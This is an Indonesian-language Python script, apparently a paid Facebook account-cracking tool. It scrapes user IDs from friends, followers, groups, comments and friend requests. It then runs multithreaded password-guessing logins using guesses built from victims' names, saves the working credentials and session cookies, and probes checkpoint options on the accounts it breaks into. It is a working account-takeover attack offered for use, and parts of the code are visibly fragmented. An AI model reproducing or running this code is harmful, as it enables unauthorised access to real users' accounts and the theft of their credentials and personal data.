# cython: language_level=3str 
import os, sys, re, time, requests, calendar, random, bs4, uuid, subprocess 
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser 
from datetime import datetime 
from datetime import date 
from urllib.parse import quote 
 
loop = 0 
id = [] 
ok = [] 
cp = [] 
ct = datetime.now() 
n = ct.month 
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"] 
try: 
	if n < 0 or n > 12: 
		exit() 
	nTemp = n - 1 
except ValueError: 
	exit() 
current = datetime.now() 
ta = current.year 
bu = current.month 
ha = current.day 
op = bulan[nTemp] 
my_date = date.today() 
hr = calendar.day_name[my_date.weekday()] 
cv_hr = {"Sunday":"Minggu", "Monday":"Senin", "Tuesday":"Selasa", "Wednesday":"Rabu", "Thursday":"Kamis", "Friday":"Jumat", "Saturday":"Sabtu"} 
nama_hari = cv_hr[hr] 
tanggal = ("%s-%s-%s-%s"%(nama_hari, ha, op, ta));tgl = ("%s %s %s"%(ha, op, ta));bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"};bulan_x = {"january": "Januari", "february": "Februari", "march": "Maret", "april": "April", "may": "Mei", "june": "Juni", "july": "Juli", "august": "Agustus", "september": "September", "october": "Oktober", "november": "November", "december": "Desember"} 
class Logo: 
	def __init__(self): 
		os.system("clear") 
		print(f"  \033[0;97m/\_____    _________________________/\  \n  \   _  \  /   _____/\__    ___/  _   /  \n  /  /_\  \ \_____  \   |    | /  /_\  \ \n /    |    \/        \  |    |/    |    \ \n \____|__  /_______  /  |____|\____|__  /\n         \/        \/ Unknow People \/ \n") 

class Login: 
			token = open("token.txt","r").read() 
			Menu() 
			Cookies() 
class Cookies: 
		Logo() 
		print(f"  > cara mendapatkan cookie facebook : \033[0;92mhttps://youtu.be/DeYroqSeJxQ\033[0;97m") 
		cok = input("\n [+] cookie fb : ") 
		if cok in ["", " "]: 
			exit("\n [!] isi yang benar jangan kosong bro") 
			data = requests.get("https://business.facebook.com/creatorstudio/home", headers = {"user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36", "cookie":cok}) 
			find_token = re.search('{"accessToken":"(EAA\w+)',data.text) 
			open("token.txt", "w").write(find_token.group(1)) 
			open("cookie.txt", "w").write(cok) 
			time.sleep(1) 
		except Exception as e: 
			os.system("rm -f token.txt cookie.txt") 
			exit("\n [!] cookie kadaluwarsa") 
class Menu: 
		GetData() 
			cok = open("cookie.txt","r").read() 
			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"] 
			print(f" [!] sepertinya akun anda terkena checkpoint") 
			Login() 
		except requests.exceptions.ConnectionError: 
			exit(" [!] terjadi kesalahan pada koneksi internet anda") 
		print(f"  > Your Name : \033[0;93m%s\033[0;97m\n"%(nama)) 
		print(f" [1]. crack dari publik teman") 
		print(f" [2]. crack dari pengikut publik") 
		print(f" [3]. crack dari target massal") 
		print(f" [4]. crack dari member group") 
		print(f" [5]. crack dari komentar post") 
		print(f" [6]. crack dari permintaan teman") 
		print(f" [7]. lihat jumlah total teman") 
		print(f" [8]. lihat hasil crack") 
		print(f" [9]. beli masa aktif") 
		print(f" [\033[0;91m0\033[0;97m]. keluar (hapus cookie)") 
		ask = input("\n [?] choose : ") 
		st = open(".status.log", "r").read() 
		if "Premium" in st: 
			if ask in ["1", "01"]: 
				DumpPublic(token, key) 
				Crack() 
			elif ask in ["2", "02"]: 
				DumpPengikut(token, key) 
			elif ask in ["3", "03"]: 
				DumpMassal(token, key) 
			elif ask in ["4", "04"]: 
				DumpGroup(token, cok) 
				print(f"") 
			elif ask in ["5", "05"]: 
				print(f" [!] untuk berhenti tekan CTRL lalu tekan c di keyboard anda.") 
				url = "https://mbasic.facebook.com/"+input(" [+] masukan id postingan : ") 
				DumpKomen(url) 
			elif ask in ["6", "06"]: 
				print(f" [!] proses mengambil id dari permintaan teman") 
				url = "https://mbasic.facebook.com/friends/center/requests" 
				DumpFL(url) 
			elif ask in ["7", "07"]: 
				CekTeman(token) 
			elif ask in ["8", "08"]: 
				LihatHasil() 
			elif ask in ["9", "09"]: 
				BeliPrem(key) 
			elif ask in ["change"]: 
				key = input(" [+] masukan license : ") 
				if key in ["", " "]: 
					exit("\n [!] isi yang benar jangan kosong") 
				os.system("rm .license.log") 
				open(".license.log","w").write(key) 
				exit("\n [!] berhasil mengganti license") 
			elif ask in ["0", "00"]: 
				os.system("rm token.txt cookie.txt") 
				exit(" [!] berhasil logout (hapus cookie)") 
				Menu() 
		else: 
			if ask in ["1", "2", "3", "4", "5", "6", "7"]: 
				exit("\n [!] kamu perlu upgrade ke premium terlebih dahulu") 
class LihatHasil: 
		print(f"\n [1] hasil crack OK") 
		print(f" [2] hasil crack CP") 
		if ask in ["1"]: 
			dirs = os.listdir("OK") 
			print(f" [*] list nama file tersimpan di folder OK\n") 
			for file in dirs:print(f" [+] "+file) 
			try: 
				file = input("\n [?] pilih nama file : ") 
				if file == "":Menu() 
				totalok = open("OK/%s"%(file)).read().splitlines() 
			except IOError:exit(" [!] file %s tidak tersedia"%(file)) 
			nm_file = ("%s"%(file)).replace("-", " ");del_txt = nm_file.replace(".txt", "") 
			print(f" [#] ----------------------------------------------") 
			print(f" [+] hasil crack : %s total : %s\033[0;92m"%(del_txt, len(totalok))) 
			os.system("cat OK/%s"%(file)) 
			print(f"\033[0;97m [#] ----------------------------------------------") 
			exit(" [!] jangan lupa di copy dan di simpan hasilnya") 
		elif ask in ["2"]: 
			dirs = os.listdir("CP") 
			print(f" [*] list nama file tersimpan di folder CP\n") 
				totalcp = open("CP/%s"%(file)).read().splitlines() 
			print(f" [+] hasil crack : %s total : %s\033[0;93m"%(del_txt, len(totalcp))) 
			os.system("cat CP/%s"%(file)) 
		else:Menu() 
class CekTeman: 
	def __init__(self, token): 
		tt = [] 
		te = [] 
		print(f" [*] isi 'me' jika ingin lihat jumlah teman") 
		user = input(" [+] masukan username atau id : ") 
		if user in [""]:exit("\n [!] mohon isi yang benar jangan kosong") 
		elif user in ["me"]:idt = "me" 
		elif(re.findall("\w+",user)): 
			r = requests.get("https://m.facebook.com/"+user).text 
			try:idt = re.findall('\;rid\=(\d+)\&',str(r))[0] 
			except:idt = user 
		try:limit = int(input("\n [?] masukan limit id (cth:1000) : ")) 
		except ValueError:exit("\n [!] masukan angka yang benar") 
		print(f" [!] tunggu sebentar sedang proses\n") 
		idi = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(idt, limit, token)).json() 
		for x in idi["data"]:tt.append(x["id"]) 
		for id in tt: 
				idi2 = requests.get("https://graph.facebook.com/%s/friends?limit=5000&access_token=%s"%(id, token)).json() 
				try: 
					for b in idi2["data"]:te.append(b["id"]) 
				except KeyError:exit("\n [!] akun facebook anda terkena spam") 
				print(f"  >  %s|%s teman"%(id, len(te))) 
				te.clear() 
			except KeyError:exit("\n [!] akun facebook anda terkena spam") 
		exit("\n [!] Selesai...") 
class DumpGroup: 
	def __init__(self, token, cok): 
		self.getmem(token, cok) 
	def getmem(self, token, cok): 
		no = 0 
		id_group = [] 
		kue = {"cookie":cok} 
		for i in requests.get("https://graph.facebook.com/me/groups?access_token=%s"%(token)).json()["data"]: 
				id_group.append(i["id"]) 
				no +=1 
			except:pass 
			print(f" [%s] %s"%(str(no), i["name"])) 
		for idg in id_group: 
				url_group = "https://mbasic.facebook.com/browse/group/members/?id="+idg 
				self.group(kue, url_group) 
			except KeyboardInterrupt:break 
	def group(self, kue, url_group): 
			sop_dev = parser(requests.get(url_group, cookies=kue).content, "html.parser") 
			members = sop_dev.find("div", id="objects_container") 
			for dev in members.find_all("table"): 
				user_ = dev["id"].replace("member_", "") 
				nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))[0] 
				try:id.append(str(user_)+"<=>"+str(nama_)) 
				except:pass 
				sys.stdout.write("\r [*] sedang mengumpulkan %s id..."%(len(id))); sys.stdout.flush() 
			if "Lihat Selengkapnya" in str(sop_dev): 
				url = sop_dev.find("a", string="Lihat Selengkapnya")["href"] 
				url_grup = "https://mbasic.facebook.com"+url 
				self.group(kue, url_grup) 
class DumpPublic: 
	def __init__(self, token, key): 
			jumlah = "5000" 
			jumlah = "1000" 
		print(f" [*] isi 'me' jika ingin dari daftar teman") 
		if user in [""]: 
			for i in requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(idt, jumlah, token)).json()["data"]: 
				id.append(i["id"]+"<=>"+i["name"]) 
			exit("\n [!] akun tidak tersedia atau list teman private") 
		if len(id) == 0: 
		print(f"\n [+] total id -> \033[0;91m%s\033[0;97m"%(len(id))) 
class DumpPengikut: 
			for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(idt, jumlah, token)).json()["data"]: 
class DumpMassal: 
		try:tanya_total = int(input(" [+] jumlah target id : ")) 
		except:tanya_total=1 
		print(f"\n [*] isi 'me' jika ingin dari daftar teman") 
		for t in range(tanya_total): 
			t +=1 
			user = input(" [+] masukan username atau id %s : "%(t)) 
			if user in [""]: 
				exit("\n [!] isi yang benar jangan kosong bro") 
			elif(re.findall("\w+",user)): 
				r = requests.get("https://m.facebook.com/"+user).text 
				try:idt = re.findall('\;rid\=(\d+)\&',str(r))[0] 
				except:idt = user 
				for i in requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(idt, jumlah, token)).json()["data"]: 
					id.append(i["id"]+"<=>"+i["name"]) 
			except KeyError: 
				print(f"\n [!] akun tidak tersedia atau list teman private") 
			print(f"\n [!] akun tidak tersedia atau list teman private") 
class DumpKomen: 
	def __init__(self, url): 
		cok = open("cookie.txt").read() 
		urlmain = requests.get(url,cookies=kue).text.encode("utf-8") 
		par = parser(urlmain,"html.parser") 
			for xf in par.find_all("h3"): 
				for xx in xf.find_all("a",href=True): 
					try: 
						if "profile.php" in xx.get("href"): 
							z = xx.get("href").split("=")[1] 
							x = z.split("&")[0] 
							uid = xx.text 
							id.append(x+"<=>"+uid) 
							sys.stdout.write("\r [*] sedang mengumpulkan %s id..."%(len(id))); sys.stdout.flush() 
					except:pass 
			for n in par.find_all("a",href=True): 
				if "Lihat komentar lainnya" in n.text: 
					DumpKomen("https://mbasic.facebook.com/"+n.get("href")) 
			if len(id) == 0: 
				exit("\n [!] tidak ada komentar atau post tidak private") 
		except KeyboardInterrupt: 
			print(f"") 
			Crack() 
class DumpFL: 
		s = parser(requests.get(url, cookies=kue).text, "html.parser") 
			for x in s.find_all("a",href=True): 
				if "/friends/hovercard" in x.get('href'): 
					nama = x.text 
					idx = "".join(bs4.re.findall('uid=(.*?)&',x.get('href'))) 
					id.append(idx+"<=>"+nama) 
				else:pass 
				if "Lihat selengkapnya" in x.text: 
					DumpFL("https://mbasic.facebook.com/"+x.get('href')) 
class BeliPrem: 
	def __init__(self, key): 
		print(f"  > license anda : %s\n"%(key)) 
		print(f" [*] informasi harga : ") 
		print(f"  > durasi 1 bulan -> Rp 50.000") 
		print(f"  > durasi 2 bulan -> Rp 100.000") 
		nowa = requests.get("https://astaxd.my.id/wa.txt", headers={"user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"}).text 
		url_wa = "https://api.whatsapp.com/send?phone=%s&text="%(nowa) 
		tks = "hallo admin saya ingin beli license premium\n\n > license saya : *%s*"%(key) 
		subprocess.check_output(["am", "start", url_wa+quote(tks)]) 
		exit("\n [!] anda di arahkan ke whatsapp admin") 
class CekOpsi: 
		ask = input(" [?] apakah anda ingin cek opsi hasil crack [Y/t]: ") 
		if ask in ["Y", "y"]: 
			print(f" [*] tunggu sebentar sedang proses masuk kedalam akun") 
			for memek in cp: 
				kontol = memek.replace("\n","") 
				titid  = kontol.split("|") 
				print(f"\n [*] cek opsi akun : \033[0;93m%s\033[0;97m"%(kontol)) 
				try:self.check_in(titid[0], titid[1]) 
				except requests.exceptions.ConnectionError:pass 
			exit("\n [#] cek opsi selesai...") 
		else:exit() 
	def check_in(self, user, pasw): 
		data = {} 
		mb = ("https://mbasic.facebook.com") 
		ua = "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]" 
		ses = requests.Session();ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"});ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser");fm = ged.find("form",{"method":"post"});list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"] 
		for i in fm.find_all("input"): 
			if i.get("name") in list:data.update({i.get("name"):i.get("value")}) 
			else:continue 
		data.update({"email":user,"pass":pasw}) 
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser") 
		if "c_user" in ses.cookies.get_dict(): 
			if "Akun Anda Dikunci" in run.text:print(f" [!] \033[0;91mAkun anda terkunci\033[0;97m") 
			else:print(f" [!] \033[0;92mAkun aman tidak checkpoint\033[0;97m") 
		elif "checkpoint" in ses.cookies.get_dict(): 
			eax = re.findall("\<title>(.*?)<\/title>",str(run));form = run.find("form");dtsg = form.find("input",{"name":"fb_dtsg"})["value"];jzst = form.find("input",{"name":"jazoest"})["value"];nh = form.find("input",{"name":"nh"})["value"];dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh};xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser") 
			ngew = [yy.text for yy in xnxx.find_all("option")] 
			if(str(len(ngew)) == "0"): 
				if "Lihat detail login yang ditampilkan. Ini Anda?" in eax: 
					print(f" [*] \033[0;92mAkun tap yes, silakan login di fb lite\033[0;97m") 
				elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(run)):print(f" [!] \033[0;91mAkun authentikasi dua faktor aktif\033[0;97m") 
				print(f" [*] terdapat "+str(len(ngew))+" opsi checkpoint") 
				for opt in range(len(ngew)): 
					print(f" ["+str(opt+1)+"] "+ngew[opt]) 
		elif "login_error" in str(run): 
			oh = run.find("div",{"id":"login_error"}).find("div").text 
			print(f" [!] %s"%(oh)) 
		else:print(f" [!] login gagal, silahkan cek kembali id dan kata sandi") 
ASTA_APK = [] 
class Crack: 
		ask = input(" [?] apakah anda ingin menggunakan sandi manual? [Y/t]: ") 
		if ask in ["", " "]: 
		elif ask in ["y", "Y"]: 
			print(f"\n [!] gunakan , (koma) untuk pemisah contoh : sayang,indonesia,bismillah,dll. setiap kata sandi minimal 6 karaker atau lebih.\n") 
			listpw = input(" [?] set kata sandi : ") 
			if len(listpw)<=5: 
				exit("\n [!] kata sandi minimal 6 karakter") 
			print(f" [*] crack dengan sandi -> [\033[0;91m%s\033[0;97m]"%(listpw.replace(",",", "))) 
			self.text_method() 
			method = input("\n [*] method : ") 
			askINFO = input(" [?] munculkan aplikasi terkait pada hasil OK? [Y/t]: ") 
			if askINFO in ["Y", "y"]:ASTA_APK.append("y") 
			else:pass 
			if method in ["1", "01"]: 
				with ThreadPoolExecutor(max_workers=30) as coeg: 
					self.text_crack() 
					for user in id: 
						uid, name = user.split("<=>") 
						coeg.submit(self.API, uid, listpw.split(",")) 
				print(f"\n\n [#] crack selesai...") 
				CekOpsi() 
			elif method in ["2", "02"]: 
						coeg.submit(self.mbasic, uid, listpw.split(",")) 
			elif method in ["3", "03"]: 
						coeg.submit(self.mobile, uid, listpw.split(",")) 
		elif ask in ["t", "T"]: 
						try: 
							uid, name = user.split("<=>") 
							ss = name.split(" ") 
							listpw = [ name, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345" ] 
							coeg.submit(self.API, uid, listpw) 
						except:pass 
							coeg.submit(self.mbasic, uid, listpw) 
							coeg.submit(self.mobile, uid, listpw) 
	def InfoAkun(self, sam): 
		hit1 = 0 
		ses = requests.Session() 
		cox = sam.split(";") 
		coki = ("%s; %s; %s; %s; %s"%(cox[4],cox[1],cox[0],cox[5],cox[3])) 
		apkx = parser(ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).content, "html.parser") 
		apkx = parser(ses.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).content, "html.parser") 
		gapk = apkx.find("form", method="post") 
		print(f"\r\033[0;97m        \_> Aplikasi Terhubung :          ") 
		for coeg in gapk.find_all("h3"): 
				hit1 +=1 
				nama_apk = coeg.find("span").text 
				print(f"\r        |_\033[0;92m%s\033[0;97m %s               "%(hit1, nama_apk)) 
		print(f"\r        |_> Cookie : \033[0;92m%s\033[0;97m"%(coki)) 
	def API(self, uid, listpw): 
		global ok, cp, loop, token 
		sys.stdout.write("\r [*] crack: %s/%s -> OK:-\033[0;92m%s\033[0;97m - CP:-\033[0;93m%s\033[0;97m "%(loop, len(id), len(ok), len(cp))); sys.stdout.flush() 
			for pw in listpw: 
				pw = pw.lower() 
				ses = requests.Session() 
				ses.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}) 
				r = ses.get("https://free.facebook.com/index.php") 
				payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://free.facebook.com/home.php"} 
				if "c_user" in ses.cookies.get_dict().keys(): 
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]) 
					if "y" in ASTA_APK: 
						print(f"\r  \033[0;92m* --> %s|%s\033[0;97m        "%(uid, pw)) 
						self.InfoAkun(kuki) 
					else: 
						print(f"\r  \033[0;92m* --> %s|%s|%s\033[0;97m"%(uid, pw, kuki)) 
					ok.append("%s|%s"%(uid, pw)) 
					open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s\n"%(uid, pw, kuki)) 
					break 
					continue 
				elif "checkpoint" in ses.cookies.get_dict().keys(): 
						token = open("token.txt", "r").read() 
						with requests.Session() as ses: 
							ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token)).json()["birthday"] 
							month, day, year = ttl.split("/") 
							month = bulan_ttl[month] 
							print(f"\r  \033[0;93m* --> %s|%s|%s %s %s\033[0;97m"%(uid, pw, day, month, year)) 
							cp.append("%s|%s"%(uid, pw)) 
							open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year)) 
							break 
					except (KeyError, IOError): 
						day = (" ") 
						month = (" ") 
						year = (" ") 
					print(f"\r  \033[0;93m* --> %s|%s\033[0;97m        "%(uid, pw)) 
					cp.append("%s|%s"%(uid, pw)) 
					open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw)) 
			loop +=1 
		except: 
			self.API(uid, listpw) 
	def mbasic(self, uid, listpw): 
				ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}) 
				r = ses.get("https://mbasic.facebook.com/index.php") 
				payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://mbasic.facebook.com/home.php"} 
			self.mbasic(uid, listpw) 
	def mobile(self, uid, listpw): 
				ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}) 
				r = ses.get("https://m.facebook.com/index.php") 
				payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/home.php"} 
				garz = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data=payload, allow_redirects=False) 
			self.mobile(uid, listpw) 
	def text_crack(self): 
		print(f"\n [+] hasil OK disimpan ke : OK/%s.txt"%(tanggal)) 
		print(f" [+] hasil CP disimpan ke : CP/%s.txt\n"%(tanggal)) 
		print(f" [!] anda bisa menjeda prosess crack dengan mematikan data seluler\n") 
	def text_method(self): 
		print(f" \n [ pilih method crack - coba method satu ]\n") 
		print(f" [1]. method API (fast)") 
		print(f" [2]. method mbasic (slow)") 
		print(f" [3]. method mobile (very slow \033[0;92mpro\033[0;97m)")
		
if __name__ == '__main__':
    Login()
